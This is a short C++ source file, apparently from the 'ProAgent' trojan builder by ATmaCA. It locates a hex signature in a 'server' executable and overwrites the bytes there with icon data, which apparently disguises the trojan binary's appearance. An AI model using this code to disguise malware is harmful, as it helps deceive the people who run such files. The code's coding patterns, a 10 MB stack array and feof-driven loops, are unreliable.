/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
int neden(AnsiString isim)
{
FILE *di1;
int adres=0;

unsigned char kr1[10000000];
//8 byte lik hexa imza: 23 00 25 2a 24 00 27 30
char kr2;
int i1=0;
if((di1=fopen(isim.c_str(),"rb")) == NULL)
{
return -1;
}
  while(!feof(di1))
    {
    kr1[i1]=getc(di1);
    i1++;
    };   rewind(di1);
    i1=0;
    while(!feof(di1))
    {
    kr2=getc(di1);
    if( kr1[i1]==0x23 && kr1[i1+1]==0x00 && kr1[i1+2]==0x25 && kr1[i1+3]==0x2a && kr1[i1+4]==0x24 && kr1[i1+5]==0x00 && kr1[i1+6]==0x27 && kr1[i1+7]==0x30  )
    {
    adres=i1;  //394 geri
    }
    i1++;
    };
fclose(di1);
//ShowMessage(adres);
return (adres-170);

}




bool Change_Icon(AnsiString ikon,AnsiString server)
{
int adres;
adres=neden(server);
if(adres==-1)
return false;
//Edit1->Text=adres;
///////////////
FILE *di,*out;
unsigned char kr;
int i=0;

 if((di=fopen(ikon.c_str(),"rb"))==NULL)  //icon dosyasi aciliyor
             {
               return false;
             }

 if((out=fopen(server.c_str(),"r+b"))==NULL)  //server dosyasi aciliyor
             { 
               fclose(di);
               return false; 
             }

  fseek(di,0x16,0); //icon dosyasinda belirlenen yere imlec konumlaniyor
  fseek(out,adres,0); //server dosyasinda belirlenen yere imlec konumlaniyor
 //////////////////////////////////
  for(i=0;i<2216;i++)     //burdaki deger ico dosyasinin boyundan 22byte kucuk olucak
                {
                  kr=getc(di);       //// yazma islemi gerceklesiyor
                  putc(kr,out);
                }
 ///////////////////////////////////
                  fclose(di);       //icon dosyasi kapatiliyor
                  fclose(out);      //server dosyasi kapatiliyor
                  return true;
}

